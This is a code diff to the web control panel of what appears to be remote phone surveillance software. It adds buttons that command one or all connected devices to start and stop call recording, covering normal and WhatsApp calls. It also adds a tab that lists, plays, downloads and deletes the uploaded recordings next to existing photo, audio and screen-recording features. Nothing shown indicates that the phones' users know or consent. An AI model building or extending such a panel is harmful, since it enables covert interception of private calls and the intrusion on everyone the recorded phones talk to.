@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+l<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -405,6 +405,11 @@
             color: white;
         }
 
+        .btn-call {
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            color: white;
+        }
+
         /* Status Box */
         .status-box {
             background: rgba(0, 0, 0, 0.5);
@@ -505,6 +510,33 @@
             border-radius: 12px;
             border: 2px solid var(--primary);
             box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
+        }
+
+        /* Call Recording Specific */
+        .device-selector {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .device-selector select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            background: #1a1a1a;
+            color: white;
+            border: 1px solid #333;
+            font-size: 16px;
+        }
+
+        .call-recording-info {
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: center;
         }
 
         /* Footer */
@@ -768,8 +800,11 @@
             <button class="tab-btn" onclick="openTab('global')">
                 <i class="fas fa-globe"></i> Global Control
             </button>
+            <button class="tab-btn" onclick="openTab('callRecordings')">
+                <i class="fas fa-phone"></i> Call Recordings
+            </button>
             <button class="tab-btn" onclick="openTab('recordings')">
-                <i class="fas fa-microphone"></i> Recordings
+                <i class="fas fa-microphone"></i> Audio Recordings
             </button>
             <button class="tab-btn" onclick="openTab('photos')">
                 <i class="fas fa-camera"></i> Photos
@@ -822,6 +857,15 @@
                     </button>
                     <button class="btn btn-stop" onclick="sendDeviceCommand('stop_screen_recording')">
                         <i class="fas fa-stop"></i> Stop Screen Recording
+                    </button>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-call" onclick="sendDeviceCommand('start_call_recording')">
+                        <i class="fas fa-phone"></i> Start Call Recording
+                    </button>
+                    <button class="btn btn-stop" onclick="sendDeviceCommand('stop_call_recording')">
+                        <i class="fas fa-phone-slash"></i> Stop Call Recording
                     </button>
                 </div>
 
@@ -896,9 +940,60 @@
                     </button>
                 </div>
 
+                <div class="btn-group">
+                    <button class="btn btn-call" onclick="sendCommand('start_call_recording')">
+                        <i class="fas fa-phone"></i> Start Call Recording All
+                    </button>
+                    <button class="btn btn-stop" onclick="sendCommand('stop_call_recording')">
+                        <i class="fas fa-phone-slash"></i> Stop Call Recording All
+                    </button>
+                </div>
+
                 <div class="status-box">
                     <h4><i class="fas fa-chart-bar"></i> Global Status</h4>
                     <div id="globalStatus">Ready to send global commands...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Call Recordings Tab -->
+        <div id="callRecordings" class="tab-content">
+            <div class="control-panel">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
+                    <h3 style="color: var(--secondary);">
+                        <i class="fas fa-phone"></i> Call Recordings
+                    </h3>
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <span id="callRecordingsCount" style="color: var(--primary); font-weight: bold;">0 recordings</span>
+                        <button class="btn btn-refresh" onclick="refreshCallRecordings()">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                    </div>
+                </div>
+
+                <div class="device-selector">
+                    <label for="callRecordingDeviceSelect" style="display: block; margin-bottom: 10px; color: var(--primary);">
+                        <i class="fas fa-mobile-alt"></i> Select Device:
+                    </label>
+                    <select id="callRecordingDeviceSelect" onchange="loadCallRecordingsForDevice()">
+                        <option value="all">All Devices</option>
+                    </select>
+                </div>
+
+                <div class="call-recording-info">
+                    <h4><i class="fas fa-info-circle"></i> Call Recording Feature</h4>
+                    <p>Call recordings will appear here when devices upload call recording files</p>
+                    <p><small>Supports: Normal Calls & WhatsApp Calls</small></p>
+                </div>
+                
+                <div class="files-grid" id="callRecordingsList">
+                    <div class="no-data">
+                        <div class="no-data-icon">
+                            <i class="fas fa-phone"></i>
+                        </div>
+                        <h3>No call recordings found</h3>
+                        <p>Call recordings will appear here when devices upload call recording files</p>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1044,12 +1139,19 @@
             // Activate clicked button
             event.currentTarget.classList.add('active');
             
+            // Load specific data when tab is opened
+            if (tabName === 'callRecordings') {
+                refreshCallRecordings();
+                populateDeviceSelector();
+            }
+            
             // Show toast for tab change on mobile
             if (window.innerWidth <= 768) {
                 const tabNames = {
                     'devices': 'Devices',
                     'global': 'Global Control',
-                    'recordings': 'Recordings',
+                    'callRecordings': 'Call Recordings',
+                    'recordings': 'Audio Recordings',
                     'photos': 'Photos',
                     'screenRecordings': 'Screen Recordings'
                 };
@@ -1095,7 +1197,8 @@
                             <strong>Files:</strong> ${data.files_count} | 
                             <strong>Photos:</strong> ${data.photos_count} | 
                             <strong>Audios:</strong> ${data.audios_count} |
-                            <strong>Screen Recordings:</strong> ${data.screen_recordings_count}
+                            <strong>Screen Recordings:</strong> ${data.screen_recordings_count} |
+                            <strong>Call Recordings:</strong> ${data.call_recordings_count}
                         `;
                     }
                 })
@@ -1103,6 +1206,128 @@
                     console.error('Error loading device details:', error);
                 });
         }
+
+        // ================== CALL RECORDINGS FUNCTIONS ==================
+
+        function populateDeviceSelector() {
+            const select = document.getElementById('callRecordingDeviceSelect');
+            // Keep "All Devices" option
+            while (select.options.length > 1) {
+                select.remove(1);
+            }
+            
+            // Add connected devices
+            deviceIds.forEach(deviceId => {
+                const option = document.createElement('option');
+                option.value = deviceId;
+                option.textContent = deviceId.length > 25 ? deviceId.substring(0, 25) + '...' : deviceId;
+                select.appendChild(option);
+            });
+        }
+
+        function loadCallRecordingsForDevice() {
+            const selectedDevice = document.getElementById('callRecordingDeviceSelect').value;
+            refreshCallRecordings(selectedDevice);
+        }
+
+        function refreshCallRecordings(deviceId = 'all') {
+            let url = '/call_recording';
+            if (deviceId && deviceId !== 'all') {
+                url = `/call_recording/device/${deviceId}`;
+            }
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    let callRecordingsHtml = '';
+                    
+                    if (data.status === 'success' && data.recordings && data.recordings.length > 0) {
+                        document.getElementById('callRecordingsCount').textContent = data.recordings.length + ' recordings';
+                        
+                        data.recordings.forEach(recording => {
+                            const fileUrl = '/call_recording/' + recording[0]; // recording ID
+                            const phoneNumber = recording[1] || 'Unknown';
+                            const callType = recording[2] || 'Normal Call';
+                            const timestamp = recording[3] || 'Unknown';
+                            const fileSize = recording.size ? (recording.size / 1024).toFixed(2) + ' KB' : '';
+                            const deviceId = recording.device_id || 'Unknown';
+                            
+                            callRecordingsHtml += `
+                                <div class="file-card">
+                                    <div class="file-header">
+                                        <div class="file-type"><i class="fas fa-phone"></i></div>
+                                    </div>
+                                    <div class="file-info">
+                                        <div><strong>Phone:</strong> ${phoneNumber}</div>
+                                        <div><strong>Type:</strong> ${callType}</div>
+                                        <div><strong>Device:</strong> ${deviceId}</div>
+                                        <div><strong>Time:</strong> ${timestamp}</div>
+                                        ${fileSize ? `<div><strong>Size:</strong> ${fileSize}</div>` : ''}
+                                    </div>
+                                    <audio controls class="audio-player">
+                                        <source src="${fileUrl}" type="audio/wav">
+                                        Your browser does not support the audio element.
+                                    </audio>
+                                    <div class="file-actions">
+                                        <button class="btn btn-camera" onclick="downloadCallRecording(${recording[0]})">
+                                            <i class="fas fa-download"></i> Download
+                                        </button>
+                                        <button class="btn btn-stop" onclick="deleteCallRecording(${recording[0]})">
+                                            <i class="fas fa-trash"></i> Delete
+                                        </button>
+                                    </div>
+                                </div>`;
+                        });
+                    } else {
+                        callRecordingsHtml = `
+                            <div class="no-data">
+                                <div class="no-data-icon">
+                                    <i class="fas fa-phone"></i>
+                                </div>
+                                <h3>No call recordings found</h3>
+                                <p>Call recordings will appear here when devices upload call recording files</p>
+                            </div>`;
+                        document.getElementById('callRecordingsCount').textContent = '0 recordings';
+                    }
+                    
+                    document.getElementById('callRecordingsList').innerHTML = callRecordingsHtml;
+                })
+                .catch(error => {
+                    console.error('Error loading call recordings:', error);
+                    document.getElementById('callRecordingsList').innerHTML = `
+                        <div class="error-message">
+                            <h3>Error loading call recordings</h3>
+                            <p>${error.message}</p>
+                        </div>`;
+                });
+        }
+
+        function downloadCallRecording(recordingId) {
+            window.open('/call_recording/' + recordingId, '_blank');
+            showToast('Downloading call recording...', 'info');
+        }
+
+        function deleteCallRecording(recordingId) {
+            if (confirm('Are you sure you want to delete this call recording?')) {
+                fetch(`/call_recording/delete/${recordingId}`, {
+                    method: 'DELETE'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        showToast('Call recording deleted successfully', 'success');
+                        refreshCallRecordings();
+                    } else {
+                        showToast('Error deleting recording: ' + data.message, 'error');
+                    }
+                })
+                .catch(error => {
+                    showToast('Error deleting recording: ' + error, 'error');
+                });
+            }
+        }
+
+        // ================== EXISTING FUNCTIONS ==================
 
         function refreshDevices() {
             // Add refresh animation
@@ -1166,12 +1391,19 @@
                                             <i class="fas fa-video"></i>
                                             <span>Screen Recording: ${device.screen_recording ? 'Yes' : 'No'}</span>
                                         </div>
+                                        <div class="device-status">
+                                            <i class="fas fa-phone"></i>
+                                            <span>Call Recording: ${device.call_recording ? 'Yes' : 'No'}</span>
+                                        </div>
                                     </div>
                                 </div>`;
                         }
                         
                         devicesGrid.innerHTML = devicesHtml;
                         document.getElementById('connectedDevicesCount').textContent = deviceIds.size;
+                        
+                        // Update device selector in call recordings tab
+                        populateDeviceSelector();
                     } else {
                         devicesGrid.innerHTML = `
                             <div class="no-data">
@@ -1314,6 +1546,27 @@
                                             <source src="${fileUrl}" type="video/mp4">
                                             Your browser does not support the video tag.
                                         </video>
+                                        <div class="file-actions">
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
+                                        </div>
+                                    </div>`;
+                            } else if (file.type === 'call_recording') {
+                                filesHtml += `
+                                    <div class="file-card">
+                                        <div class="file-header">
+                                            <div class="file-type"><i class="fas fa-phone"></i></div>
+                                        </div>
+                                        <div class="file-info">
+                                            <div><strong>File:</strong> ${file.filename}</div>
+                                            <div><strong>Phone:</strong> ${file.phone_number || 'Unknown'}</div>
+                                            <div><strong>Type:</strong> ${file.call_type || 'Normal Call'}</div>
+                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                        </div>
+                                        <audio controls class="audio-player">
+                                            <source src="${fileUrl}" type="audio/wav">
+                                        </audio>
                                         <div class="file-actions">
                                             <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
                                             <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
@@ -1564,6 +1817,7 @@
                             refreshPhotos();
                             refreshFiles();
                             refreshScreenRecordings();
+                            refreshCallRecordings();
                             if (currentDeviceId) {
                                 refreshDeviceFiles();
                             }
@@ -1617,6 +1871,7 @@
         setInterval(refreshFiles, 5000);
         setInterval(refreshPhotos, 5000);
         setInterval(refreshScreenRecordings, 5000);
+        setInterval(refreshCallRecordings, 5000);
         setInterval(updateTime, 1000);
         
         // Initial load
@@ -1625,6 +1880,7 @@
         refreshFiles();
         refreshPhotos();
         refreshScreenRecordings();
+        refreshCallRecordings();
         updateTime();
         setupMobileMenu();
         
